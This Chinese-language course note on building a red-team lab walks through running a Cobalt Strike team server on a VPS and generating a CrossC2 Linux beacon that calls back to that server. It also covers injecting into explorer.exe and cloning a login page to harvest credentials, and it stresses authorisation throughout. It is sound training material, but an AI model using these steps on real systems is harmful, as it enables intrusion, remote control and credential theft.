> **适用范围提醒**：本文整理的是课堂演练中「搭建一个自己完全控制的实验环境」的方法与概念。
> 所有操作都只应发生在**自有靶机**或**获得书面授权的演习环境**中。文中涉及的公网地址、凭据、实例标识均已做抽象化处理。

## 一句话概括

**靶场**就是一台（或几台）你可以随便折腾、随时快照回滚的机器。搭建靶场的核心工作只有一件：**把「操作机 → 公网入口 → 靶机」这三者的网络关系理清楚**，让流量能按你设计的方向流动。

## 原理

### 1. 为什么需要一个专属的靶场

| 真实目标的限制 | 靶场提供的自由 |
|---|---|
| 不能反复失败重试（触发告警、被封 IP） | 想重试多少次都行 |
| 不能重启、不能改配置 | 随便改，改坏了回滚快照 |
| 不能装调试器、看不了日志 | 源码、日志、进程全可见 |
| 一次操作可能造成真实损失 | 隔离网络，出不了圈 |
| 不可复现（环境会变） | **可快照、可重放、可对照** |

一句话：靶场把「一次性的、有风险的试探」变成了**可重复的实验**。这也是「漏洞复现」能在其中成立的前提。

### 2. 实验环境的三类角色

课堂演练里通常需要三台不同职责的机器：

| 角色 | 说明 | 关键要求 |
|---|---|---|
| **操作机**（你面前的 Windows / Kali） | 跑客户端、发指令、抓包分析 | 能连到团队服务器 |
| **公网入口**（云 VPS / 服务器） | 跑服务端，是唯一有公网 IP 的角色 | 有公网 IP、端口可开放 |
| **靶机**（虚拟机 / 独立主机） | 被操作的那台，是「目标」 | 能主动连出去（回连） |

数据流向是这样的：

```text
靶机（虚拟） ──执行载荷──→ 回连到 ──→ 公网 VPS（监听中）
                                          ↑
                      操作机（你）────────┘ 连上去下达指令

即：所有「上线」的本质，都是靶机主动往外连，而不是你连进去。
```

### 3. 监听器（Listener）到底该设在哪

这是原文里提出的核心疑问，值得单独讲清：

> 「我需要通过 CobaltStrike 上线我自己的虚拟机，那我的监听输入的 vps 是我的服务器还是我的虚拟机的？」

**答案：监听器设在公网服务器（VPS）上，填的是 VPS 的公网 IP。**

为什么？因为「上线」这件事的方向是**靶机 → 你**（回连）。靶机需要一个**它能访问到的、稳定的地址**去连。而你的操作机通常在 NAT 后面、没有公网 IP、IP 还会变，靶机根本连不上。

| 方案 | 监听器位置 | 载荷里填的 IP | 结论 |
|---|---|---|---|
| **A（推荐）** | 公网 VPS | VPS 的公网 IP | 靶机直接从互联网回连；操作机可以随时断开，VPS 持续监听 |
| B | 本机 / 内网机器 | 本机内网 IP | 只在**同一内网**里可行；跨网段就断 |

方案 A 的关键等式：

```text
监听器 IP = 团队服务器 IP = VPS 的公网 IP
```

它的三条好处：

1. 靶机可以从互联网直接回连；
2. 操作机断开也不影响 —— 监听在 VPS 上一直跑着；
3. 这是红队演练的标准做法（服务端与操作端分离）。

**一个常见的坑**：如果把监听器设在本地、载荷里填了内网地址 `192.168.x.x`，那么只有处在同一内网的靶机能连回来。跨网段时载荷会「打出去就没了」，表现为「执行了但一直不上线」。

### 4. 服务扫描：先搞清楚靶机上有什么

服务扫描的目的是**识别目标系统开放的端口和运行的服务**。它是任何实验的起点 —— 不先摸清对方的服务面，后续的动作都是盲猜。

| 技术 | 说明 |
|---|---|
| TCP / UDP 端口扫描 | 有哪些端口开着 |
| 服务版本检测 | 端口后面跑的是什么服务、什么版本 |
| 操作系统指纹识别 | 目标大概是什么系统 |

在实验环境里，扫描的最大价值是**验证你自己的假设** —— 比如「我起了个 80 端口的 Web 服务，靶机能不能访问到」，扫一下就有结论。

### 5. 多模式端口监听

实验环境里往往需要同时监听好几种流量：

| 监听类型 | 用途 |
|---|---|
| 反弹 Shell 监听 | 接收靶机主动连回来的 Shell |
| 文件传输监听 | 传载荷进去、传结果出来 |
| 代理转发监听 | 建隧道，让流量从这一跳继续往内网走 |

这和「端口转发」是同一个问题的两面 —— 隧道怎么建、流量往哪走，见《服务器初始化与端口转发》。

## 本题情景与解题手法

### 题目形态

课堂任务：在自己的实验环境里，完成一次**靶机上线**的完整演练 —— 从零把服务端跑起来，直到在操作端看到靶机出现在会话列表里。

### 第一步：准备三台角色机器

按上面第 2 节的拓扑分配角色：

- 公网 VPS：确认**有公网 IP**、需要的端口**在安全组/防火墙里放行**；
- 靶机：确认**能访问公网**（这是回连成立的前提）；
- 操作机：装好客户端，确认能连到 VPS。

**这一步的判据是「通不通」，不是「装没装」**：在 VPS 上起一个临时的监听，从靶机上试着连一下，能通再往下做。

### 第二步：启动团队服务器（服务端）

在 VPS 上：

```bash
cd /root/Server
chmod +x TeamServerImage          # 赋可执行权限
./teamserver <VPS公网IP> <密码>    # 启动，参数是「对外地址」和「连接口令」
```

判断依据：**启动后 VPS 上会多出一个处于监听状态的端口**，这个端口就是操作机后续要连的入口。

```text
root@<主机名>:~/Server# ./teamserver <公网IP> <密码>
```

### 第三步：从操作机连上去并配置监听器

连接成功后，在客户端里**创建一个监听器**：

- **Host 填 VPS 的公网 IP**（不是本机内网 IP）；
- Port 选一个 VPS 上已放行的端口；
- 记住这个 `IP:Port` —— **它会被写进载荷里**，靶机就是往这里回连。

### 第四步：生成载荷并投递到靶机

标准动作是「创建监听 → 生成载荷 → 投递到靶机」：

```javascript
// 概念流程
创建监听器  →  用该监听器生成载荷  →  把载荷送到靶机上执行  →  等待回连
```

针对 Linux 靶机，课堂里用的是一条交叉生成命令（工具名与参数结构如下，地址已抽象）：

```bash
chmod +x genCrossC2.Linux
./genCrossC2.Linux <VPS公网IP> <监听端口> null null Linux x64 ./linux.out
```

参数依次是：**回连地址、回连端口、协议、证书、目标系统、架构、输出文件名**。

> 一个小细节：生成命令里的地址，必须和第三步监听器的 Host **完全一致**。这两个值对不上，载荷就跑去了一个没人监听的地址，表现就是「执行了但不上线」。

投递环节在课堂里演示的是「文件传输到靶机」，命令形如：

```bash
scp <载荷文件> <用户>@<服务器>:<目录>
```

### 第五步：等待回连并确认上线

判断依据（**必须是客观证据，不能靠感觉**）：

| 证据 | 说明 |
|---|---|
| 服务端日志出现回连记录 | 「host called home」这类日志行 |
| 客户端会话列表出现新主机 | 能看到主机名、用户名、内网 IP |
| 能在该会话上执行一条无害命令 | 例如 `pwd` / `getuid`，有回显就说明通道通了 |

课堂里用的确认方式就是最简单的「敲一条命令看有没有回显」：

```bash
# 在信标会话里
beacon> pwd              # 查看当前目录
beacon> ls               # 列出文件，确认文件是否存在
```

```text
[12/05 12:57:05] [*] Tasked beacon to run: ...
[12/05 12:57:06] [+] host called home, sent: 55 bytes
[12/05 12:57:16] [+] received output:
 驱动器 C 中的卷是 Windows-SSD
 卷的序列号是 002E-C1BA
```

看到 `received output` 且内容是真的命令输出，才算**确认上线**。

### 操作手法一句话总结

> **先想清楚「谁连谁」** —— 上线是靶机主动回连，所以必须有一个靶机能访问到的公网入口 → **把团队服务器跑在有公网 IP 的 VPS 上** → 监听器 Host 填 VPS 公网 IP → 生成的载荷里写同一个 `IP:Port` → 投递到靶机执行 → 用**服务端日志 + 会话列表 + 一条命令的回显**三重证据确认上线。

## 上线后的基本操作参考

会话建立后，客户端通过一组内置指令与被控端交互。下面按用途分组（这是工具的帮助输出，仅作参考）：

### 会话与基本信息

| 指令 | 作用 |
|---|---|
| `help` | 帮助 |
| `pwd` / `cd` / `ls` | 当前目录 / 切换目录 / 列文件 |
| `mkdir` / `cp` / `mv` / `rm` | 目录与文件的常规操作 |

| `sleep <秒>` | 设置回连间隔（`sleep 3` = 所有指令 3 秒执行） |
| `jobs` / `jobkill` | 列出后台任务 / 杀死一个后台任务 |
| `clear` | 清除会话内部的任务队列 |
| `note` / `exit` | 备注 / 退出会话 |

### 远程桌面的一个具体例子（原笔记的用法）

要接管图形界面，先拿到目标桌面进程的 PID，再注入进去：

```bash
# 1. 取 explorer.exe 的进程号
shell C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "(Get-Process explorer).Id"

# 2. 以 64 位方式注入到该进程
inject <explorer的PID> x64
```

判断依据：注入成功后再执行 `desktop` / 截图类指令，看到的就是**用户的真实桌面**而不是独立会话的空白桌面。

## 站点克隆（授权钓鱼演练）

「克隆网站」是演练中常用的一环：把目标的登录页**原样复制**到自己的服务上，诱导参演人员在克隆页面上输入凭据，从而验证「人员安全意识」这一环的防护效果。

要点：

- 克隆页面需要**把表单的提交目标改到自己的服务**，否则输入会直接发给真实站点；
- 服务监听的端口可以自行指定（原笔记里改成了 **8899**）；
- 参演人员在克隆页上输入的内容，会**被服务端记录下来** —— 这就是「钓鱼等待输入，通过键盘记录可得」的含义；
- 这类演练**必须提前取得书面授权并划定参演范围**，否则就构成真实的钓鱼。

> 此处原为「克隆站点配置页」与「收到输入的记录界面」的两张截图，要点：一是把站点克隆出来并改到自定义端口；二是页面上输入的内容会被完整记录。

## 常见「载荷」类型与检测

演练中会用不同类型的载荷来测试不同防护层的效果：

| 类型 | 常见技术 | 检测思路 |
|---|---|---|
| **Windows EXE** | 进程注入、持久化机制、反检测 | 文件哈希、数字签名、行为监控 |
| **Windows DLL** | DLL 劫持、搜索顺序劫持加载 | 监控异常的 DLL 加载路径 |
| **Java** | Java 反序列化、JSP WebShell | 监控异常的类加载与 Web 目录新增文件 |
| **Office 宏** | 利用 Office 宏执行代码 | 禁用宏、监控 Office 派生子进程 |
| **载荷捆绑** | 捆绑器把额外内容与正常程序合并、安装程序包装、图标伪装 | **哈希校验 + 数字签名验证** |

一句话：**「图标伪装」骗的是眼睛，「哈希校验 / 数字签名」验的是真相** —— 这也是演练的价值所在：证明前者在真实场景里确实会失效。

## 踩坑与备注

- **「执行了但一直不上线」的排查顺序**：① 载荷里的地址端口和监听器是否**完全一致**；② VPS 的端口在安全组/防火墙里是否放行；③ 靶机能不能访问公网；④ 监听器是不是新建在该靶机对应的通道上。按这个顺序查，比反复重新生成载荷有效得多。
- **不要用 root 直接操作**：原文在服务器初始化环节明确提醒过 —— 一来避免误操作破坏系统，二来需要权限时用 `sudo` 临时提升更安全。
- **原笔记里出现过多个真实公网 IP、一个真实口令、一个云主机实例标识，以及本机用户目录路径**，本文已统一抽象为 `x.x.x.x` / `<密码>` / `<主机名>` / `<用户>`，并删除了指向本机截图的死链引用。
- **`scp` / `wget` 里的地址要跟着换**：原文里有一段把载荷推送到服务器的示例，其中的目标地址与本地路径都属于一次性环境信息，实战时替换成自己的 VPS 地址和真实路径。
- **工具是工具，授权是前提**：本文整理的所有指令，默认使用场景是**自有靶机或已授权演习**。在被控端执行凭据类、持久化类指令，会留下明显的痕迹，也会造成真实的破坏 —— 这类指令只应出现在明确授权的范围内。
